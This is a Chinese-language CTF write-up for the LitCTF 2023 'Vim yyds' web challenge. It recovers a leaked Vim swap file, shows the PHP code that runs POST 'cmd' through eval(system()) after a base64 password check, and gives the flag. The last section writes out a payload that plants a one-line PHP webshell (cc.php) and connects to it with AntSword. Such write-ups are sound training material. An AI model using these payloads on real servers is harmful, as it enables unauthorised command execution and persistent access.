[LitCTF 2023\]Vim yyds | NSSCTF](https://www.nssctf.cn/problem/3866)
> [!TIP]
题目涉及vim，并且说泄露了

![image](https://github.com/user-attachments/assets/330c9d3a-8ede-4a7a-acbb-d9a663704952)
搜索相关资料得到
## **Vim**泄露知识
![image](https://github.com/user-attachments/assets/b8067f3f-896e-4191-98aa-e37f8fa6d830)
因此我们的切入点来了
> [!TIP]
尝试访问**.index.php.swp**
Windows电脑上的vim不太好用，我是说有点麻烦，不太好操作
## 使用kali系统用vim来操作
![image](https://github.com/user-attachments/assets/5c34ea41-0a39-4861-b0c5-7986aae6d18d)
访问后会下载相应的文件，我们使用vim打开
> 打开终端

![image](https://github.com/user-attachments/assets/e0380a9b-fbc7-4a85-9e36-697745fbd432)
输入
```
vim -r index.php.swp
```
![image](https://github.com/user-attachments/assets/eb401094-65f3-4ecf-a70b-48ba56709feb)
得到
```
<head>
    <meta charset="UTF-8">
    <style type="text/css">
        body,
        html {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        div.vim {
            display: flex;
            align-content: center;
            vertical-align: middle;
            justify-content: center;
        }

        img {
            border: none;
            width: 8rem;
            height: auto;
        }

        h1.vim_yyds {
            color: #50f728;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            margin-top: 50;
            margin-left: 5px;
        }

        h3.vim_said {
            color: #39c2ff;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        br,
        p {
            font-size: 20;
        }
    </style>
</head>

<body>
    <main>
        <div class="vim">
            <img src="https://www.bing.com/th?id=OSAAS.7B95FA2D97CE022F5E7949F60E350A25&pid=TechQna"></img>
            <h1 class="vim_yyds">
                Vim yyds
            </h1>
        </div>
        <h3 class="vim_said">
            队里师傅说Vim是世界上最好的编辑器，不接受反驳
        </h3>
        <div class="can_can_vim">
            <?php
            error_reporting(0);
            $password = "Give_Me_Your_Flag";
            echo "<p>can can need Vim </p>";
            if ($_POST['password'] === base64_encode($password)) {
                echo "<p>Oh You got my password!</p>";
                eval(system($_POST['cmd']));
            }
            ?>
        </div>
    </main>
</body>
```
## 找到有用的东西在后面的password
> [!IMPORTANT]
可以通过hackbar来post参数，这里的意思是我们要将**Give_Me_Your_Flag**转为base64将password发送

![image](https://github.com/user-attachments/assets/b8e9b736-aced-41c3-a238-48fcb009ce2c)
第一次尝试出问题
![image](https://github.com/user-attachments/assets/416f16c3-693e-423e-8112-6bd4e770dc14)
> 重新传一遍

![image](https://github.com/user-attachments/assets/94003c10-5223-45b2-aad2-8668c3759c2e)
## 得到flag
**NSSCTF{c39b484e-3955-43a2-b57e-1768857cae2c}**
## 别的师傅的方法，使用蚁剑
写入webshell：
```php
<?php eval($_POST[cc]);?>
PD9waHAgZXZhbCgkX1BPU1RbY2NdKTs/Pg==
echo "PD9waHAgZXZhbCgkX1BPU1RbY2NdKTs/Pg==" | base64 -d >cc.php
password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&cmd=echo "PD9waHAgZXZhbCgkX1BPU1RbY2NdKTs/Pg==" | base64 -d >cc.php
```
蚁剑连接：http://node6.anna.nssctf.cn:28516/cc.php 密码为cc
我尝试的过程中上传不了webshell，不知道为啥
## 总结
- 学会vim的常见泄露知识
- 使用hackbar来方便的发送post请求